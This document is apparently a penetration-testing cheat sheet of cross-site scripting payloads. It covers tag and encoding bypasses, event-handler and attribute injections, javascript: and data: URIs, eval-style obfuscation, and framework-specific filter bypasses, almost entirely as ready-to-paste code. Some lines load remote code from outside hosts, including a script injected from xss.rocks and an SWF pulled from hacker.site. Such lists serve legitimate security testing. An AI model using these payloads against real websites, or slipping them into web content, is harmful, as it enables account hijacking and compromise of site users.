# XSS (Cross Site Scripting)
**Web Content-Types to XSS**

The following content types can execute XSS in all browsers:
* text/html
* application/xhtml+xml
* application/xml
* text/xml
* image/svg+xml
* text/plain (?? not in the list but I think I saw this in a CTF)
* application/rss+xml (off)
* application/atom+xml (off)

In other browsers other Content-Types can be used to execute arbitrary JS, check:

https://github.com/BlackFan/content-type-research/blob/master/XSS.md

**xml Content Type**

If the page is returnin a text/xml content-type it's possible to indicate a namespace and execute arbitrary JS
```javascript
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->

```


-----
**Injecting inside raw HTML**

```javascript

<script>alert(1)</script>
<img src=x onerror=alert(1) />
<svg onload=alert('XSS')>

```
**Blacklist Bypasses**

```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //

```
**Length bypass (small XSSs)**

```javascript

<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``>
<script src=//aa.es>
<script src=//℡㏛.pw>

```
**Injecting inside HTML tag**

```javascript
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t

//Style events
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
**Bypass inside event using HTML encoding/URL encode**
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>

//Note that URL encode will also work
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>

//Bypass inside event using Unicode encode
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />

```
**Special Protocols Within the attribute**

There you can use the protocols javascript: or data: in some places to execute arbitrary JS code. Some will require user interaction on some won't.
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3aalert(1)
java        //Note the new line 
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==

```

**Places where you can inject these protocols**
```javascript
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf 
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf 
<iframe srcdoc="<svg onload=alert(4);>">

```
**Other obfuscation tricks**
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">

&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>

//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />

```

**Reverse tab nabbing**

If you can inject any URL in an arbitrary <a href= tag that contains the target="_blank" and rel="opener" attributes
```javascript

<a target="_blank" rel="opener"

```

**on Event Handlers Bypass**
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B

```
**XSS in "Unexploitable tags" (hidden input, link, canonical, meta)**
```javascript
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle=alert(1)>

//And in meta tags
<!-- Injection inside meta attribute-->
<meta name="apple-mobile-web-app-title" content=""Twitter popover id="newsletter" onbeforetoggle=alert(2) />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>


//You can execute an XSS payload inside a hidden attribute, provided you can persuade the victim into pressing the key combination. On Firefox Windows/Linux the key combination is ALT+SHIFT+X and on OS X it is CTRL+ALT+X. You can specify a different key combination using a different key in the access key attribute. Here is the vector
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**Inside JS code**

If <> are being sanitised you can still escape the string where your input is being located and execute arbitrary JS. It's important to fix JS syntax, because if there are any errors, the JS code won't be executed
```javascript
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//

```
**Template literals ``**


In order to construct strings apart from single and double quotes JS also accepts backticks `` . This is known as template literals as they allow to embedded JS expressions using ${ ... } syntax.
Therefore, if you find that your input is being reflected inside a JS string that is using backticks, you can abuse the syntax ${ ... } to execute arbitrary JS code
```javascript
`${alert(1)}`
`${`${`${`${alert(1)}`}`}`}`

// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop(){return loop}
loop``````````````

```
**Encoded code execution**
```javascript
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</iframe>">

```

**Unicode Encode JS execution**
```javascript
\u{61}lert(1)
\u0061lert(1)
\u{0061}lert(1)

```
**Arbitrary function (alert) call**
```javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie']) 
with(document)alert(cookie) 
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>

```
**PHP FILTER_VALIDATE_EMAIL flag Bypass**
```javascript

"><svg/onload=confirm(1)>"@x.y

```
**Ruby-On-Rails bypass**

Due to RoR mass assignment quotes are inserted in the HTML and then the quote restriction is bypassed and additoinal fields (onfocus) can be added inside the tag.
Form example, if you send the payload:
```javascript

contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa


//The pair "Key","Value" will be echoed back like this
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}

```

**Special combinations**
```javascript
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">

```












